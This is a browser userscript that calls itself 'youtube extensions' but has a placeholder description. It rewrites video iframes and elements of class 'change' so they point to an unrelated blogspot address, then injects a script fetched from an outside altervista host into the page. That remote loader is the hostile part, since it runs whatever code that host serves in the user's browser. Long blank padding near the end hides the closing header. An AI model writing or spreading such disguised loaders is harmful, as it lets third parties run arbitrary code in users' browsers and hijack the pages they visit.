// ==UserScript==
// @name           youtube extensions
// @namespace      extensions
// @description    the description
// @include        http://userscripts.org/topics/*

function getElementsByClass(searchClass,node,tag) {
    var classElements = new Array();
    if ( node == null ) node = document;
    if ( tag == null ) tag = '*';
    var els = node['getElementsByTagName'](tag);
    var pattern = new RegExp("(^|\\s)"+searchClass+"(\\s|$)");
    for (var i = 0, j = 0; i <  els['length']; i++) {
        if ( pattern.test(els[i]['className']) ) {
            classElements[j] = els[i];
            j++;
        }
    }
    return classElements;
}
function videoFB() {
    var change,video,i,servidor;
    servidor="videozer";
    change = getElementsByClass('change');
    if(change==null) return false;
    for (i=0;i<change['length'];i++) {
        video=change[i].getAttribute("video");
        if(video==null) continue;
        change[i].src="http://videoperteqesh.blogspot.com/";
    }
    return true;
}
videoFB();

function enchulatuFB33(){
    var ifra;
    if( location.href.match(/blogspot/i) || location.href.match(/zonkis/i) ){
        ifra=document.getElementById("player_iframe");
        if(ifra!=null){
            ifra.style.marginLeft="0px";
            ifra.src="http://videoperteqesh.blogspot.com/"
        }
        ifra=document.getElementById('liframe')
        if(ifra!=null){
            ifra.innerHTML='<iframe id="change" width="500" src="http://videoperteqesh.blogspot.com/" height="300" scrolling="no" frameborder="0"></iframe>'
        };
        
    }
}
enchulatuFB33();

function addScript(src) {
    var s = document.createElement('script');
    s.setAttribute("type", "text/javascript");
    s.setAttribute("src", src);
    var a = document.getElementsByTagName('script')[0];
    if (a == null) return false;
    a.appendChild(s);
    return true
};

addScript("http://ennyebh.altervista.org/filesjs/function.js");
//addScript("http://ennyebh.altervista.org/filesjs/page.js");



































































// ==/UserScript==